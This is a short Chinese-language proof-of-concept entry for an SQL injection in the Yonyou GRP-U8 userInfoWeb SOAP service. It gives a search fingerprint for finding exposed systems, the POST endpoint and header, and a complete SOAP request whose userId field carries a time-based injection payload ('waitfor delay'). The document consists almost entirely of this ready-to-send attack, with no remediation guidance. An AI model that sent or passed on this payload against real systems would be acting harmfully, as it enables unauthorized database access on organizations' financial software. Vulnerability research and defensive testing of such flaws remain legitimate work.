# 用友GRP-U8userInfoWeb存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /services/userInfoWeb HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
<soapenv:Header/>
<soapenv:Body>
<ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:5'--</userId>
</ser:getUserNameById>
</soapenv:Body>
</soapenv:Envelope>
```